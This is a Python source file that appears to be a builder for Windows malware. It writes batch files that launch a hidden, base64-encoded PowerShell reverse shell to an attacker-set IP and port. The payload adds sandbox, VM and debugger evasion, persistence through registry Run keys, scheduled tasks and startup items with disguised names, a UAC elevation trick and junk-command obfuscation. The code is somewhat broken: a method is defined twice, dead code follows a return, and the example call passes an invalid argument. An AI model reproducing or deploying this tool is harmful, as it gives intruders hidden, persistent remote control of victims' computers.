from dataclasses import dataclass, field
from typing import List, Dict
from cryptography.fernet import Fernet
import random
import string
import zlib
from pathlib import Path
from datetime import datetime
import base64

@dataclass
class BatchConfig:
    # Connection Settings
    ip: str
    port: int
    
    # Evasion Settings - All disabled by default
    process_masking: bool = False
    memory_randomization: bool = False
    anti_debug: bool = False
    anti_analysis: bool = False
    
    # Persistence Settings - All disabled by default
    persistence: bool = False
    startup_persistence: bool = False
    scheduled_task: bool = False
    
    # Advanced Settings - All disabled by default
    keystroke_simulation: bool = False
    env_checks: bool = False
    uac_bypass: bool = False
    stealthy: bool = True  # This one should stay True as it's inverse of dev_mode
    
    # System Settings
    sleep_interval: int = 30
    max_retries: int = 3
    process_migration: bool = False
    target_process: str = "explorer.exe"
    amsi_bypass: bool = False
    encryption_key: bytes = field(default_factory=lambda: Fernet.generate_key())
    output_dir: str = "generated_payloads"

class EnhancedBatchBuilder:
    def __init__(self):
        self.junk_functions = [
            "setlocal", "endlocal", "verify", "path", "cd", "dir", 
            "type", "more", "copy", "move", "del"
        ]
        self.system_checks = [
            "tasklist", "netstat", "systeminfo", "whoami", "net",
            "reg", "wmic", "sc"
        ]


    def _generate_evasion_code(self, config: BatchConfig) -> str:
        """Generate evasion code based on configuration"""
        evasion_code = []
        
        if config.stealthy:
            # Add basic command echo control
            evasion_code.append("@echo off")
            evasion_code.append("setlocal EnableDelayedExpansion")
            
            # Add random labels for goto jumps
            label1 = ''.join(random.choices(string.ascii_letters, k=8))
            label2 = ''.join(random.choices(string.ascii_letters, k=8))
            
            if config.env_checks:
                evasion_code.extend([
                    ":: Environment checks",
                    f"goto {label1}",
                    f":{label1}",
                    'set "_check=0"',
                    'for %%v in (VMwareService.exe VGAuthService.exe VBoxService.exe) do (',
                    '    tasklist /FI "IMAGENAME eq %%v" 2>NUL | find /I /N "%%v">NUL',
                    '    if !ERRORLEVEL! EQU 0 set "_check=1"',
                    ')',
                    'wmic diskdrive get size | find "42949672960" >NUL 2>&1',
                    'if !ERRORLEVEL! EQU 0 set "_check=1"',
                    'if !_check! EQU 1 (',
                    '    exit /b',
                    ')',
                    ""
                ])
                
            if config.anti_analysis:
                evasion_code.extend([
                    ":: Anti-analysis checks",
                    'set "_sus=0"',
                    'for %%p in (ida.exe ollydbg.exe windbg.exe x32dbg.exe x64dbg.exe',
                    '          processhacker.exe procexp.exe procexp64.exe',
                    '          procmon.exe procmon64.exe wireshark.exe',
                    '          fiddler.exe tcpview.exe perfmon.exe) do (',
                    '    tasklist /FI "IMAGENAME eq %%p" 2>NUL | find /I /N "%%p">NUL',
                    '    if !ERRORLEVEL! EQU 0 set "_sus=1"',
                    ')',
                    'if !_sus! EQU 1 (',
                    '    exit /b',
                    ')',
                    ""
                ])
                
            if config.anti_debug:
                evasion_code.extend([
                    ":: Anti-debug measures",
                    f"goto {label2}",
                    f":{label2}",
                    'if defined _DEBUG exit /b',
                    'if defined DEBUG exit /b',
                    "if not \"%~1\"==\"\" exit /b",
                    ""
                ])
        
            # Add junk functions for obfuscation
            junk_commands = self.generate_junk_commands(3)
            evasion_code.extend(junk_commands)
            
        return "\r\n".join(evasion_code)

    def _generate_persistence_code(self, config: BatchConfig) -> str:
        """Generate persistence mechanisms based on configuration"""
        persistence_code = []
        
        if config.persistence:
            if config.startup_persistence:
                persistence_code.extend([
                    ':: Startup Persistence',
                    'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemCore" /t REG_SZ /d "%~f0" /f >nul 2>&1'
                ])
            
            if config.scheduled_task:
                persistence_code.extend([
                    ':: Scheduled Task Persistence',
                    'schtasks /create /tn "SystemCore" /tr "%~f0" /sc onlogon /rl highest /f >nul 2>&1'
                ])
        
        return '\r\n'.join(persistence_code)

    def _generate_keystroke_simulation(self, config: BatchConfig) -> str:
        """Generate keystroke simulation if enabled"""
        if not config.keystroke_simulation:
            return ""
            
        return '''
:: Keystroke Simulation
powershell -WindowStyle Hidden -Command "$sh = New-Object -ComObject WScript.Shell; Start-Sleep -Seconds 1; $sh.SendKeys(' ')"
'''
    def generate_random_label(self) -> str:
        """Generate a random label for batch file branching."""
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(12))

    def generate_junk_commands(self, count: int) -> List[str]:
        """Generate a list of junk commands for obfuscation."""
        commands = []
        for _ in range(count):
            cmd = random.choice(self.junk_functions)
            if cmd in ["setlocal", "endlocal", "verify"]:
                commands.append(f"{cmd}")
            else:
                label = self.generate_random_label()
                commands.append(f"{cmd} > nul 2>&1 || goto {label}")
                commands.append(f":{label}")
        return commands

    def generate_environment_checks(self) -> str:
        """Generate environment checks to detect virtualization."""
        checks = [
            '@echo off',
            'setlocal EnableDelayedExpansion',
            '',
            'set "_check=0"',
            '',
            'for %%v in (VMwareService.exe VGAuthService.exe) do (',
            '    tasklist /FI "IMAGENAME eq %%v" 2>NUL | find /I /N "%%v">NUL',
            '    if !ERRORLEVEL! EQU 0 set "_check=1"',
            ')',
            '',
            'wmic diskdrive get size | find "42949672960" >NUL 2>&1',
            'if !ERRORLEVEL! EQU 0 set "_check=1"',
            '',
            'if !_check! EQU 1 (',
            '    exit /b',
            ')',
            ''
        ]
        return '\r\n'.join(checks)

    def _generate_uac_bypass(self, config: BatchConfig) -> str:
        """Generate UAC bypass if enabled"""
        if not config.uac_bypass:
            return ""
            
        return '''
:: UAC Bypass
set "params= %*"
cd /d "%~dp0" && ( if exist "%temp%\\getadmin.vbs" del "%temp%\\getadmin.vbs" )
fsutil dirty query %systemdrive% 1>nul 2>nul || (
    echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\\getadmin.vbs"
    "%temp%\\getadmin.vbs"
    exit /B
)
del "%temp%\\getadmin.vbs" /f /q 2>nul
'''

    def _generate_persistence_code(self, config: BatchConfig) -> str:
        """Generate persistence mechanisms based on configuration"""
        persistence_code = []
        
        if config.persistence:
            if config.startup_persistence:
                persistence_code.extend([
                    ':: Startup Persistence',
                    'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemCore" /t REG_SZ /d "%~f0" /f >nul 2>&1'
                ])
            
            if config.scheduled_task:
                persistence_code.extend([
                    ':: Scheduled Task Persistence',
                    'schtasks /create /tn "SystemCore" /tr "%~f0" /sc onlogon /rl highest /f >nul 2>&1'
                ])
        
        return '\r\n'.join(persistence_code)

    def _encode_powershell(self, script: str) -> str:
        """Encode PowerShell script to base64"""
        script_bytes = script.encode('utf-16le')
        return base64.b64encode(script_bytes).decode()

    def _generate_powershell_reverse_shell(self, config: BatchConfig) -> str:
        """Generate PowerShell reverse shell with configurable features"""
        shell_code = '''
        try {
            # Basic configuration
            $ErrorActionPreference = 'SilentlyContinue'
            $ProgressPreference = 'SilentlyContinue'
        '''

        if config.process_masking:
            shell_code += '''
            $mutex = New-Object System.Threading.Mutex($false, "Global\\PersistentShell")
            if (-not $mutex.WaitOne(0, $false)) {
                exit
            }
        '''

        if config.anti_analysis:
            shell_code += '''
            function Test-Environment {
                $suspicious = $false
                $suspiciousUsers = @('sandbox', 'virus', 'malware', 'admin', 'test', 'user', 'analyst')
                if ($suspiciousUsers -contains $env:USERNAME.ToLower()) { return $true }
                $drive = Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'"
                if ($drive.Size -lt 60GB) { return $true }
                return $false
            }
            if (Test-Environment) { exit }
        '''

        if config.anti_debug:
            shell_code += '''
            function Test-Debug {
                if ([System.Diagnostics.Debugger]::IsAttached) { return $true }
                $startTime = Get-Date
                Start-Sleep -Milliseconds 1
                $endTime = Get-Date
                if (($endTime - $startTime).TotalMilliseconds -gt 100) { return $true }
                return $false
            }
        '''

        shell_code += '''
            function Start-PersistentConnection {
                param(
                    [string]$ip = "''' + config.ip + '''",
                    [int]$port = ''' + str(config.port) + '''
                )

                while ($true) {
                    try {
                        $client = $null
                        $connected = $false
                        $retryCount = 0
        '''

        if config.memory_randomization:
            shell_code += '''
                        $randomSize = Get-Random -Minimum 1MB -Maximum 10MB
                        $randomBuffer = New-Object byte[] $randomSize
                        [System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($randomBuffer)
                        [System.GC]::Collect()
        '''

        shell_code += '''
                        while (-not $connected -and $retryCount -lt ''' + str(config.max_retries) + ''') {
                            try {'''

        if not config.stealthy:
            shell_code += '''
                                Write-Host "[*] Attempting connection..."'''

        shell_code += '''
                                $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
                                if ($client.Connected) {
                                    $connected = $true
                                    $stream = $client.GetStream()
                                    $buffer = New-Object System.Byte[] 65536
                                    $encoding = New-Object System.Text.ASCIIEncoding

                                    # Send system info
                                    $sysinfo = @{
                                        'Hostname' = $env:COMPUTERNAME
                                        'OS' = [System.Environment]::OSVersion.ToString()
                                        'Username' = $env:USERNAME
                                        'Elevated' = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
                                        'Architecture' = $env:PROCESSOR_ARCHITECTURE
                                        'ProcessID' = $PID
                                        'Version' = "1.0"
                                    } | ConvertTo-Json
                                    
                                    $sendbyte = $encoding.GetBytes($sysinfo + "`n")
                                    $stream.Write($sendbyte, 0, $sendbyte.Length)

                                    while ($client.Connected) {
                                        while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
        '''

        if config.anti_debug:
            shell_code += '''
                                            if (Test-Debug) { exit }
        '''

        shell_code += '''
                                            $command = $encoding.GetString($buffer, 0, $i)
                                            try {
                                                $output = Invoke-Expression -Command $command 2>&1 | Out-String
                                                $sendback = $output + "PS " + (Get-Location).Path + "> "
                                                $sendbyte = $encoding.GetBytes($sendback)
                                                $stream.Write($sendbyte, 0, $sendbyte.Length)
                                                $stream.Flush()
                                            } catch {
                                                $sendback = $_.Exception.Message + "`nPS " + (Get-Location).Path + "> "
                                                $sendbyte = $encoding.GetBytes($sendback)
                                                $stream.Write($sendbyte, 0, $sendbyte.Length)
                                                $stream.Flush()
                                            }
                                        }
                                    }
                                }
                            } catch {
                                $retryCount++
                                Start-Sleep -Seconds ''' + str(config.sleep_interval) + '''
                            }
                        }
                    } catch {} finally {
                        if ($client) {
                            $client.Close()
                            $client.Dispose()
                        }
                        if ($stream) {
                            $stream.Close()
                            $stream.Dispose()
                        }
                    }
                    Start-Sleep -Seconds ''' + str(config.sleep_interval) + '''
                }
            }

            # Setup persistence
        '''

        if config.persistence:
            if config.startup_persistence:
                shell_code += '''
            try {
                $startup = "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SystemCore.ps1"
                Copy-Item $PSCommandPath $startup -Force
            } catch {}
        '''
            
            if config.scheduled_task:
                shell_code += '''
            try {
                $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File $PSCommandPath"
                $trigger = New-ScheduledTaskTrigger -AtStartup
                Register-ScheduledTask -TaskName "SystemCore" -Action $action -Trigger $trigger -Force
            } catch {}
        '''

        if config.keystroke_simulation:
            shell_code += '''
            $simulation = Start-Job {
                while ($true) {
                    $wsh = New-Object -ComObject WScript.Shell
                    Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 300)
                    $wsh.SendKeys(' ')
                }
            }
        '''

        # Main execution with proper cleanup
        shell_code += '''
            # Main connection loop with automatic restart
            while ($true) {
                $job = Start-Job -ScriptBlock ${function:Start-PersistentConnection}
                Wait-Job $job
                Start-Sleep -Seconds ''' + str(config.sleep_interval) + '''
            }
        } catch {} finally {
            if ($mutex) { $mutex.ReleaseMutex() }'''

        if config.keystroke_simulation:
            shell_code += '''
            if ($simulation) { 
                Stop-Job $simulation
                Remove-Job $simulation -Force 
            }'''

        shell_code += '''
        }
        '''

        return shell_code

        """Generate PowerShell reverse shell with all configurable features"""
        shell_code = '''
        # Basic configuration
        $ErrorActionPreference = 'SilentlyContinue'
        $ProgressPreference = 'SilentlyContinue'

        # Ensure only one instance is running
        $mutex = New-Object System.Threading.Mutex($false, "Global\PowerShellReverseShell")
        if (-not $mutex.WaitOne(0, $false)) {
            exit
        }
        '''

        # Anti-Analysis features
        if config.anti_analysis:
            shell_code += '''
        # Anti-Analysis Checks
        function Test-Environment {
            $suspicious = $false
            
            # Check for common sandbox usernames
            $suspiciousUsers = @('sandbox', 'virus', 'malware', 'admin', 'test', 'user', 'analyst')
            if ($suspiciousUsers -contains $env:USERNAME.ToLower()) { 
                $suspicious = $true 
            }
            
            # Check for small disk size (common in VMs)
            $drive = Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'"
            if ($drive.Size -lt 60GB) { 
                $suspicious = $true 
            }
            
            # Check for low memory (common in VMs)
            $memory = Get-WmiObject Win32_ComputerSystem
            if ($memory.TotalPhysicalMemory -lt 2GB) {
                $suspicious = $true
            }
            
            # Check for VM-related processes
            $vmProcs = @(
                'vmtoolsd', 'vm3dservice', 'vmwaretray', 'vmwareuser',
                'vboxservice', 'vboxtray'
            )
            foreach($proc in Get-Process | Select-Object -ExpandProperty Name) {
                if ($vmProcs -contains $proc.ToLower()) {
                    $suspicious = $true
                    break
                }
            }
            
            return $suspicious
        }

        if (Test-Environment) {
            exit
        }
        '''

        # Process masking if enabled
        if config.process_masking:
            shell_code += '''
        # Process Masking
        $currentProc = Get-Process -Id $PID
        $currentProc.ProcessName = "svchost"
        '''

        # Memory randomization if enabled
        if config.memory_randomization:
            shell_code += '''
        # Memory Pattern Randomization
        $randomSize = Get-Random -Minimum 1MB -Maximum 10MB
        $randomBuffer = New-Object byte[] $randomSize
        [System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($randomBuffer)
        [System.GC]::Collect()
        '''

        # Anti-debug features
        if config.anti_debug:
            shell_code += '''
        # Anti-Debug Checks
        function Test-Debug {
            $debugged = $false
            
            # Check for debugger
            if ([System.Diagnostics.Debugger]::IsAttached) {
                $debugged = $true
            }
            
            # Check for common debugging tools
            $debugTools = @(
                'ida64.exe', 'ida.exe', 'ollydbg.exe', 'x64dbg.exe',
                'x32dbg.exe', 'windbg.exe', 'dnspy.exe'
            )
            foreach($tool in Get-Process | Select-Object -ExpandProperty Name) {
                if ($debugTools -contains $tool.ToLower()) {
                    $debugged = $true
                    break
                }
            }
            
            # Check execution timing
            $startTime = Get-Date
            Start-Sleep -Milliseconds 1
            $endTime = Get-Date
            $elapsed = ($endTime - $startTime).TotalMilliseconds
            if ($elapsed -gt 100) {  # Significant delay indicates debugging
                $debugged = $true
            }
            
            return $debugged
        }

        if (Test-Debug) {
            exit
        }
        '''

        # Keystroke simulation if enabled
        if config.keystroke_simulation:
            shell_code += '''
        # Keystroke Simulation
        function Simulate-Keystrokes {
            $wsh = New-Object -ComObject WScript.Shell
            $keys = @('a', 'b', 'c', 'd', 'e', 'f', 'g')
            $delay = Get-Random -Minimum 100 -Maximum 300
            
            foreach($key in $keys | Get-Random -Count 3) {
                Start-Sleep -Milliseconds $delay
                $wsh.SendKeys($key)
            }
        }

        # Run keystroke simulation in background
        Start-Job -ScriptBlock ${function:Simulate-Keystrokes}
        '''

        # Main connection logic with infinite retry
        shell_code += f'''
        while($true) {{  # Infinite outer loop for persistence
            try {{
                $client = $null
                
                while($true) {{  # Inner connection loop
                    try {{
                        if (-not $stealthy) {{ Write-Host "[*] Attempting connection..." }}
                        $client = New-Object System.Net.Sockets.TCPClient('{config.ip}', {config.port})
                        $stream = $client.GetStream()
                        $writer = New-Object System.IO.StreamWriter($stream)
                        $reader = New-Object System.IO.StreamReader($stream)

                        # Send system info
                        $sysinfo = @{{
                            'Hostname' = $env:COMPUTERNAME
                            'OS' = [System.Environment]::OSVersion.ToString()
                            'Username' = $env:USERNAME
                            'Elevated' = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
                            'Architecture' = $env:PROCESSOR_ARCHITECTURE
                            'ProcessID' = $PID
                            'AntiVirus' = (Get-WmiObject -Namespace "root/SecurityCenter2" -Class AntiVirusProduct | Select-Object displayName).displayName
                            'Version' = "1.0"
                        }} | ConvertTo-Json
                        
                        $writer.WriteLine($sysinfo)
                        $writer.Flush()

                        # Add persistence mechanisms if enabled
                        if ({str(config.persistence).lower()}) {{
                            try {{
                                if (-not $stealthy) {{ Write-Host "[*] Setting up persistence..." }}
                                
                                # Create scheduled task
                                $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $encodedCommand"
                                $trigger = New-ScheduledTaskTrigger -AtLogOn
                                $settings = New-ScheduledTaskSettingsSet -Hidden
                                Register-ScheduledTask -TaskName "SystemServiceHost" -Action $action -Trigger $trigger -Settings $settings -Force
                                
                                # Add to startup
                                $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.vbs"
                                $shortcut = (New-Object -ComObject WScript.Shell).CreateShortcut($startupPath)
                                $shortcut.TargetPath = "powershell.exe"
                                $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $encodedCommand"
                                $shortcut.Save()
                            }} catch {{
                                if (-not $stealthy) {{ Write-Host "[!] Persistence setup failed" }}
                            }}
                        }}

                        while($client.Connected) {{
                            if($stream.DataAvailable) {{
                                $command = $reader.ReadLine()
                                if($command -eq "exit") {{ break }}
                                
                                $output = try {{
                                    $result = Invoke-Expression -Command $command 2>&1 | Out-String
                                    if($result.Length -eq 0) {{ "Command executed successfully" }} else {{ $result }}
                                }} catch {{
                                    $_.Exception.Message
                                }}
                                
                                $writer.WriteLine($output)
                                $writer.WriteLine("PS $PWD>")
                                $writer.Flush()
                            }}
                            Start-Sleep -Milliseconds 100
                            
                            # Run anti-debug check periodically if enabled
                            if ({str(config.anti_debug).lower()}) {{
                                if (Test-Debug) {{ break }}
                            }}
                        }}
                    }} catch {{
                        if (-not $stealthy) {{ Write-Host "[!] Connection error. Retrying..." }}
                        Start-Sleep -Seconds {config.sleep_interval}
                    }} finally {{
                        if ($client -ne $null) {{ $client.Close() }}
                        if ($writer -ne $null) {{ $writer.Close() }}
                        if ($reader -ne $null) {{ $reader.Close() }}
                    }}
                    Start-Sleep -Seconds {config.sleep_interval}
                }}
            }} catch {{
                Start-Sleep -Seconds {config.sleep_interval}
            }} finally {{
                if ($client) {{ $client.Close() }}
                if ($mutex) {{ $mutex.ReleaseMutex() }}
                Get-Job | Remove-Job -Force
            }}
            Start-Sleep -Seconds {config.sleep_interval}
        }}
        '''

        return shell_code

    def _encode_base64(self, data: str) -> str:
        """Encode string as base64"""
        return base64.b64encode(data.encode('utf-16le')).decode()

    def obfuscate_powershell(self, ps_script: str) -> str:
        """Encode PowerShell script."""
        script_bytes = ps_script.encode('utf-16le')
        return base64.b64encode(script_bytes).decode('ascii')

    def build_payload(self, config: BatchConfig) -> str:
        """Build the batch payload with all configured options"""
        if not config.stealthy:
            payload_lines = [
                "@echo off",
                "echo [*] Debug Mode Enabled",
                "echo [*] Starting payload generation...",
                ""
            ]
        else:
            payload_lines = ["@echo off"]

        # Add all components based on configuration
        components = [
            self._generate_uac_bypass(config) if config.uac_bypass else "",
            self._generate_evasion_code(config) if config.stealthy else "",
            self._generate_persistence_code(config) if config.persistence else "",
            self._generate_keystroke_simulation(config) if config.keystroke_simulation else "",
        ]

        # Add environment checks if enabled
        if config.env_checks:
            payload_lines.extend([
                ":: Environment Checks",
                "set \"_check=0\"",
                "for %%v in (VMwareService.exe VGAuthService.exe) do (",
                "    tasklist /FI \"IMAGENAME eq %%v\" 2>NUL | find /I /N \"%%v\">NUL",
                "    if !ERRORLEVEL! EQU 0 set \"_check=1\"",
                ")",
                "if !_check! EQU 1 (",
                "    exit /b",
                ")",
                ""
            ])

        # Add each component
        for component in components:
            if component:
                payload_lines.append(component)

        # Add main payload logic with PowerShell reverse shell
        ps_script = self._generate_powershell_reverse_shell(config)
        encoded_script = self._encode_powershell(ps_script)
        
        if config.stealthy:
            payload_lines.append(f"powershell.exe -nop -w hidden -e {encoded_script}")
        else:
            payload_lines.extend([
                "echo [*] Launching PowerShell payload...",
                f"powershell.exe -nop -w 1 -e {encoded_script}",
                "echo [*] Payload execution completed"
            ])

        return "\r\n".join(payload_lines)

    def generate_payload_file(self, config: BatchConfig) -> Path:
        """Generate payload file with provided configuration"""
        try:
            # Create output directory
            output_dir = Path(config.output_dir)
            output_dir.mkdir(exist_ok=True)
            
            # Generate filename
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            mode = "stealth" if config.stealthy else "test"
            filename = f"payload_{mode}_{timestamp}.bat"
            filepath = output_dir / filename
            
            # Generate and write payload
            payload = self.build_payload(config)
            with open(filepath, "w", encoding='ascii', newline='\r\n') as f:
                f.write(payload)
            
            return filepath
            
        except Exception as e:
            raise Exception(f"Failed to generate payload: {str(e)}")

if __name__ == "__main__":
    try:
        builder = EnhancedBatchBuilder()
        config = BatchConfig(
            ip="192.168.1.100",
            port=4444,
            execution_delay=5,
            persistence=True,
            uac_bypass=True,
            env_checks=True,
            process_migration=True,
            target_process="explorer.exe"
        )
        
        filepath = builder.generate_payload_file(config)
        print(f"Successfully generated payload: {filepath}")
        
    except Exception as e:
        print(f"Error: {str(e)}")